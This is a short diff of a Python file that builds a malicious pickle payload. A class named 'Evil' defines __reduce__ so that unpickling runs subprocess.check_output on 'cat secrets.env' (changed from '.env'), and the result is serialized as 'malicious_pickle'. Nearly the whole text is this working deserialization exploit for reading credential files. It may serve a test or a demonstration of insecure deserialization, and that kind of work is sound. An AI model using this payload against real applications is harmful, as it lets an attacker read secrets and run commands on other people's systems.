@@ -3,7 +3,7 @@ import subprocess
 
 class Evil:
     def __reduce__(self):
-        return (subprocess.check_output, (["cat", ".env"],))
+        return (subprocess.check_output, (["cat", "secrets.env"],))
 
 # Pickle
 malicious_pickle = pickle.dumps(Evil())
